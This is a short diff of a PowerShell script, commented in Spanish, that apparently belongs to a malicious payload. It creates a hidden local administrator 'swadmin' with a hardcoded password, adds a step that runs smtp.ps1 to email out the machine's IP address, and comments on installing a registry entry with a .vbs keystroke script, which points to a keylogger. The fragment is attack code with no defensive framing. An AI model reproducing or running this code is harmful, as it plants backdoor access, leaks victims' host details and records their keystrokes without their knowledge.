@@ -37,11 +37,13 @@ $NewLocalAdmin = "swadmin"
 $Password = (ConvertTo-SecureString "Melon123$!" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
 
+#Enviando dirección ip por correo
+./smtp.ps1
+
 #Crear directorio en %temp%
 mkdir $path
 cd $path
-mv $initial_dir/smtp.txt ./smtp.ps1
-./smtp.ps1
+
 
 #Instalando registro con script de teclas .vbs y .reg
 #$reg_file = random_text 
